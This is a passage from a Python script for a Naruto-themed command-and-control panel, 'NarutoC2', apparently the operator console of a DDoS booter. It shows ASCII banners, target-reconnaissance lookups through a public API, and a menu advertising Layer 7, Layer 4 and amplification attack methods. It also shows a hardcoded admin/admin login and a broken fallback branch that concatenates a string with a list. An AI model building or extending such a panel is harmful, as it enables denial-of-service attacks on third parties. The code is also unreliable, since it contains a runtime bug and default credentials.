        elif "rasengan" in cnc:
            print("""
\x1b[38;2;30;144;255m              ⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀
\x1b[38;2;30;144;255m              ⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
\x1b[38;2;30;144;255m              ⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
\x1b[38;2;30;144;255m              ⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
\x1b[38;2;30;144;255m              ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
\x1b[38;2;30;144;255m              ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
\x1b[38;2;30;144;255m              ⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀
\x1b[38;2;30;144;255m              ⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀
\x1b[38;2;30;144;255m                    🌀 RASENGAN! 🌀
""")

        elif "sasuke" in cnc:
            print("""
\x1b[38;2;30;144;255m              ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\x1b[38;2;30;144;255m              ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\x1b[38;2;30;144;255m              ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\x1b[38;2;30;144;255m                       ⚡ CHIDORI! ⚡
""")

        elif "ramen" in cnc:
            print("""
\x1b[38;2;255;140;0m           🍜🍜🍜🍜🍜🍜🍜🍜🍜🍜🍜
\x1b[38;2;255;140;0m           🍜  ICHIRAKU RAMEN SHOP  🍜
\x1b[38;2;255;140;0m           🍜  NARUTO'S FAVORITE!   🍜
\x1b[38;2;255;140;0m           🍜🍜🍜🍜🍜🍜🍜🍜🍜🍜🍜
""")

        elif "leaf-village" in cnc:
            print("""
\x1b[38;2;255;140;0m              🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃
\x1b[38;2;255;140;0m              🍃    HIDDEN LEAF VILLAGE    🍃
\x1b[38;2;255;140;0m              🍃   WHERE THE FIRE BURNS!   🍃
\x1b[38;2;255;140;0m              🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃
""")

        # NINJA TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ 🍃 Chakra Network Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "help" in cnc:
            print(f'''
\x1b[38;2;255;140;0m🍃═══════════════ NARUTO C2 JUTSU MANUAL ═══════════════🍃

\x1b[38;2;255;165;0mFIRE-JUTSU   \x1b[38;2;255;255;255m► SHOW FIRE STYLE ATTACKS (Layer 7)
\x1b[38;2;30;144;255mWATER-JUTSU  \x1b[38;2;255;255;255m► SHOW WATER STYLE ATTACKS (Layer 4)  
\x1b[38;2;255;140;0mTAIL-BEAST   \x1b[38;2;255;255;255m► SHOW TAILED BEAST POWER (AMP Methods)
\x1b[38;2;255;165;0mFORBIDDEN-JUTSU \x1b[38;2;255;255;255m► SHOW FORBIDDEN TECHNIQUES
\x1b[38;2;30;144;255mNINJA-WAY    \x1b[38;2;255;255;255m► SHOW NINJA CODE OF HONOR
\x1b[38;2;255;140;0mNINJA-TOOLS  \x1b[38;2;255;255;255m► SHOW RECONNAISSANCE JUTSU
\x1b[38;2;255;165;0mNINJA-ART    \x1b[38;2;255;255;255m► SHOW COOL ASCII BANNERS
\x1b[38;2;30;144;255mCHAKRA-GATES \x1b[38;2;255;255;255m► SHOW TARGET PORTS
\x1b[38;2;255;140;0mCLEAR        \x1b[38;2;255;255;255m► CLEAR SCREEN JUTSU

\x1b[38;2;255;140;0m🍥═══════════════════════════════════════════════════════🍥
            ''')

        else:
            try:
                cmmnd = cnc.split()
                print("🍃 Jutsu: [ " + cmmnd + " ] Not Found in the Ninja Arts!")
                print("🍥 Try 'help' to see all available techniques, dattebayo!")
            except IndexError:
                pass


def login():
    clear()
    user = "admin"
    passwd = "admin"
    username = input("🍃 Username: ")
    password = getpass.getpass(prompt='🍥 Password: ')
    if username != user or password != passwd:
        print("")
        print("🍃 Access Denied!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🍃 Welcome to the NarutoC2!")
        print("🍥 Believe it! Your ninja journey begins now...")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
